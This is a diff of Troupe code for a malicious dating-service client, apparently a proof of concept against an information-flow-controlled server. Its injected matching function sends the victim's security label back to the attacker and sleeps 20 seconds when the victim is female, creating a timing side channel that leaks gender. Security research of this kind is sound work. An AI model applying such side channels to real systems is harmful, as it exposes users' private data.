@@ -1,4 +1,4 @@
-(* Troupe code for a malicious client that sends a profile with a level that is too high. *)
+(* Troupe code for a malicious client that can trigger a sleep on the server and announce what level the victim got and identify by that *)
 
 import lists
 import stdio
@@ -7,45 +7,49 @@ import declassifyutil
 let 
     fun loopLevel () =
                 let 
-                    val _ = print "Waiting for LeackedInfo response..."
-
-                    val malResponse = receive [hn ("LeackedInfo", malResponse) => malResponse]
-                    val _ = printWithLabels ("LeackedInfo: ", malResponse)
-                    val (c1) = malResponse
-
-                  
+                    val mal = receive [hn ("LevelLabel", mal) => mal]
+                    val _ = if mal = `{}`
+                        then
+                            ()
+                        else    
+                            printWithLabels ("Victim is: ", mal)
                 in
-                  loopLevel ()
+                    loopLevel()             
                 end
-    
 
     fun client server_id =
         let
-
+        
+            (*Define the profile of the user*)
             val lev = `{}`
-            val name = ""
+            val name = "MALICIOUS1"
             val year = 0
-            val gender = ""
+            val gender = false
             val interests = ""
             val profile = (lev, name, year, gender, interests)
-
             val pid = self()
 
             val agentfn = fn (levX,nameX,yearX,genderX,interestsX) =>
-                    let 
-                        
+                    let
 
-                        val leckedGender = if (genderX)
-                            then
-                                true
-                            else
-                                false
-
-                        val preference = true
+                        (*Contacts itself as soon as the function is used, levX is sent to correlate time with a security label *)
+                        val _ = send(pid, ("LevelLabel", levX))    
                         val maybeProfile = ()
-                        val _ = send (pid, ("LeackedInfo", (leckedGender)))
-                    
 
+                        (*if match with the second malicious client a match should be triggered in order to reveal time elapsed indicating data leakage *)
+                        val preference = if nameX = "MALICIOUS2"
+                                then
+                                    true
+                                else
+                                    false
+                        
+                        (*if gender is female, then sleep for 20 sec*)
+                        val _ = if genderX
+                            then
+                                sleep 20000
+                            else
+                                ()
+                  
                     in
                         (preference, maybeProfile)
                     end
@@ -55,8 +59,7 @@ let
             loopLevel ()
         end
 
-    
     val serverId = whereis ("@id-server", "datingServer")   
 in
-    spawn (fn () => client serverId) 
+    spawn (fn () => client serverId)
 end
